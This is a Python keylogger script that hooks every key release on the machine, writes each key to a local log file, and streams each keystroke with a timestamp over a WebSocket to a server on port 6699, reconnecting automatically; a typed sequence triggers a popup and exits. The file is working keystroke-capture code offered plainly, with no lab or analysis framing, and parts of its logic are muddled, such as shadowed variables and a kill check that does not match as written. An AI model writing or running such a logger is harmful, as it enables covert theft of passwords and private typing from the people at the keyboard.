import keyboard
import logging
import os
import requests
import time
import threading
import json
import websocket

# Set up logging
log_file = "logs.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define ws and ws_lock as global variables
ws = None
ws_lock = threading.Lock()

# Define the function to log key events
def log_key_event(event):
    global ws, ws_lock  # Access the global variables

    logging.info(event.name)

    # Send the key event instantly via WebSocket
    try:
        with ws_lock:
            if ws and ws.sock and ws.sock.connected:
                ws.send(json.dumps({"key": event.name, "timestamp": time.time()}))
                print(f"Key sent: {event.name}")
            else:
                print("WebSocket is not connected. Key not sent.")
    except Exception as e:
        print(f"Error sending key via WebSocket: {e}")

    # Check for the specific sequence "crash{Enter}{Enter}{Enter}"
    if event.name == "enter":
        log_key_event.enter_count += 1
    elif event.name == "crash":
        log_key_event.enter_count = 0  # Reset if "crash" is typed
    else:
        log_key_event.enter_count = 0  # Reset for any other key

    if log_key_event.enter_count == 3:  # Trigger after "crash{Enter}{Enter}{Enter}"
        os.system('msg * "Stopped!"')  # Popup message
        os._exit(0)  # Kill the script

# Initialize the counter for "enter" key presses
log_key_event.enter_count = 0

# Function to send logs via WebSocket
def send_logs():
    last_sent_size = 0  # Initialize within the WebSocket thread
    ws = None  # Shared WebSocket object
    ws_lock = threading.Lock()  # Lock to ensure thread-safe access to ws

    def on_open(websocket):
        print("WebSocket connection opened.")
        with ws_lock:
            nonlocal ws
            ws = websocket

    def on_close(websocket, close_status_code, close_msg):
        print(f"WebSocket connection closed. Code: {close_status_code}, Message: {close_msg}")
        if close_status_code or close_msg:
            print("Connection closed due to an issue. Investigating...")
        with ws_lock:
            nonlocal ws
            ws = None

    def on_error(websocket, error):
        print(f"WebSocket error: {error}")

    def on_message(websocket, message):
        print(f"Message from server: {message}")

    # Ensure WebSocket connection is persistent and reconnects automatically
    def start_websocket():
        global ws, ws_lock
        while True:
            try:
                websocket_app = websocket.WebSocketApp(
                    "ws://localhost:6699",
                    on_open=lambda ws: print("WebSocket connection opened."),
                    on_close=lambda ws, code, msg: print(f"WebSocket closed: {code}, {msg}"),
                    on_error=lambda ws, error: print(f"WebSocket error: {error}"),
                )

                # Assign the WebSocket object to the global variable
                with ws_lock:
                    ws = websocket_app

                # Run the WebSocket connection in a blocking manner
                websocket_app.run_forever()
            except Exception as e:
                print(f"WebSocket error: {e}")

            print("WebSocket connection lost. Reconnecting in 5 seconds...")
            time.sleep(5)  # Wait before attempting to reconnect

    # Start the WebSocket connection in a separate thread
    threading.Thread(target=start_websocket, daemon=True).start()

    # Remove the send_new_logs thread since we are sending keys instantly

# Start the WebSocket log sending
send_logs()

# Add a listener for key events
keyboard.on_release(callback=log_key_event)

# Keep the program running
keyboard.wait()
